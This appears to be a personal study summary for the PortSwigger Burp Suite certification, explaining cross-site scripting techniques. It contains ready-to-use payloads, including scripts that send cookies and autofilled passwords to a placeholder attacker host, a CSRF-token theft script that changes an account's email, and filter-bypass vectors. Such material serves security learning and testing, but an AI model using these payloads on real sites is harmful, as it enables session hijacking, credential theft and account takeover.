##### PortSwigger BurpSuite Certification Summary
# XSS
The classic way of checking if there is a XSS vulnerability is invoking the `alert()` or `print()` function:
```
<script>alert()</script>
```

To show on which domain the JS code is executing on, this can be used:
```
<script>alert(document.domain)</script>
```
## Reflected XSS
This method of XSS is the simplest version and can be done when the application reflects data of a request in the response. For example, a parameter might be given with a request:
```
https://website.com/search?parameter=foo
```

Information can be sent to a host controlled by the attacker in the following way:
```
<script>
fetch('https://ATTACKER-HOST', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

This sends the user's cookie to the attacker's host, a common technique, as a user cookie allows for impersonation.

Another effective way of obtaining credentials is to make the user's password autocompletion fill in the password and sending it to the attacker. For this, a login form is used:
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://ATTACKER-HOST',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

Triggering some (for the attacker benefitial) action can sometimes be done directly, such as a password reset:
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

#### Blocked Tags and Attributes
HTML elements can be blocked by the WAF, but there can still be some permitted. Enumerating all possible tags will reveal which and can be done with the Intruder. In the according input, try all tags with:
```
<§§>
```

If a permitted tag is found, the events should be enumerated:
```
<body §§=1>
```

When knowing which tag and event is permitted, the attack can be crafted, where the even should be triggered:
```
<iframe src="https://VICTIM-HOST/?search=<body onresize=print()>" onload=this.style.width='100px'>
```

It can be that only custom tags are allowed. However, it is fairly easy to define one's own tag:
```
<script>
location = 'https://VICTIM-HOST/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```

Here the `location` variable is needed for the exploit to work. The tag name and id however are arbitrary. The `onfocus` event is triggered with the `#x` command.

In case `SVG` tags are allowed with an animation action, the command can look something like this:
```
<svg><animatetransform onbegin=alert(1)>
```
The XSS cheat sheet provides all actions for the `animatetransform` which can be enumerated like usually. 

### XSS within HTML Tags
In this scenario, the script will be defined within a tag, so the normal flow has to be broken first. Often the brackets are blocked, but there are multiple ways of breaking out of the tag:
```
" autofocus onfocus=alert(1) x="
```
This sequence tries to focus on the element and thus triggering the `onfocus` event. The `x=` is there to produce valid code after the breakout happened.

The tag can also allow JS code to be run natively, such as `href`:
```
<a href="javascript:alert(1)">
```

##### Access Keys
There is a functionality which allows shortcut to be defined for an action, such as opening a link. An `accesskey` attribute can be set for the whole page and trigger an arbitrary command:
```
http://VICTIM-HOST?'accesskey='x'onclick='alert(1)
```
### XSS within JavaScript
This is a scenario where the XSS context is in some JS code. The attack can break out of the script and perform arbitrary actions:
```
</script><img src=1 onerror=alert(1)>
```
This leaves the script broken, but the attacker code is still carried out. The context in which the user input is in can often be seen in the response, e.g.:
```
<script>
  var searchTerms = 'lolo\'lol';
  document.write('<img src="/resources/images/tracker.gif? 
  searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
where it can also be seen which characters get escaped.

In case the string can be escaped, JS code can be carried out directly. For this, the script has to be "fixed" after escaping the string, because the script runs only if it works as a whole. Escaping can be done with:
```
'-alert(1)-'
';alert(1)//
```
In the situation where quote characters are escaped with a backslash, it can still be that the backslash itself is not escaped. Therefore, the convertion looks like this:
```
\';alert(1)//

becomes

\\';alert(1)//
```
